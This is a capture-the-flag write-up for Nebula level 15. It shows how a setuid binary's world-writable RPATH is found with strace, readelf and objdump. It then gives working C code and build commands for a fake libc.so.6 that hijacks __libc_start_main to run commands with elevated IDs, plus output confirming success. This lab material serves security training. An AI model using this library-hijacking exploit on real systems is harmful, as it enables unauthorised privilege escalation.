nebula-exercises
================
> notes about nebula exercises

> [ref: exploit-exercises.com/nebula/](https://exploit-exercises.com/nebula/)


level 15
--------

##### inspect flag15 binary

```bash
# 0. see 'man dlopen' for linker dynamic library search priority order
level15@nebula:~$ man dlopen
(ELF only) If the executable file for the calling program contains a DT_RPATH tag,
and does not contain a  DT_RUN‐PATH tag then the directories listed in the DT_RPATH tag are searched.

# 1. strace binary: trace system calls
level15@nebula:~$ strace /home/flag15/flag15
open("/var/tmp/flag15/libc.so.6", O_RDONLY)

# 2. readelf / objdump / nm binary: get more information about dynamic section and symbols

# readelf
level15@nebula:~$ readelf --dynamic /home/flag15/flag15 
Dynamic section at offset 0xf20 contains 21 entries:
  Tag        Type                         Name/Value
 0x00000001 (NEEDED)                     Shared library: [libc.so.6]
 0x0000000f (RPATH)                      Library rpath: [/var/tmp/flag15]

# objdump headers
level15@nebula:~$ objdump -x /home/flag15/flag15
Dynamic Section:
  NEEDED               libc.so.6
  RPATH                /var/tmp/flag15

# objdump dynamic symbols
level15@nebula:~$ objdump --dynamic-syms /home/flag15/flag15

/home/flag15/flag15:     file format elf32-i386

DYNAMIC SYMBOL TABLE:
00000000      DF *UND*	00000000  GLIBC_2.0   puts
00000000  w   D  *UND*	00000000              __gmon_start__
00000000      DF *UND*	00000000  GLIBC_2.0   __libc_start_main
080484cc g    DO .rodata	00000004  Base        _IO_stdin_used

# nm undefined symbols
level15@nebula:~$ nm --undefined-only /home/flag15/flag15 
w _Jv_RegisterClasses
w __gmon_start__
U __libc_start_main@@GLIBC_2.0
U puts@@GLIBC_2.0
```

##### build a fake libc calling the getflag binary

```c
// fake_libc.c
#include <sys/types.h>

void __cxa_finalize(void * d)
{

}

int __libc_start_main(
    int *(main) (int, char * *, char * *),
    int argc, char * * ubp_av, void (*init) (void),
    void (*fini) (void), void (*rtld_fini) (void), void (* stack_end))
{

  gid_t gid;
  uid_t uid;

  gid = getegid();
  uid = geteuid();

  setresgid(gid, gid, gid);
  setresuid(uid, uid, uid);
  system("getflag");
}
```
```
# version.map
GLIBC_2.0 {
        global:
		__libc_start_main;
};
```
```bash
# build dynamic fake lib with a version script and static link
level15@nebula:~$ gcc --shared -fPIC -static-libgcc -Wl,--version-script=./version.map,-Bstatic fake_libc.c -o libc.so.6
```

##### copy it to RPATH

```bash
level15@nebula:~$ cp libc.so.6 /var/tmp/flag15/
```

##### run suid flag15
```bash
level15@nebula:~$ /home/flag15/flag15 
You have successfully executed getflag on a target account
Segmentation fault
```
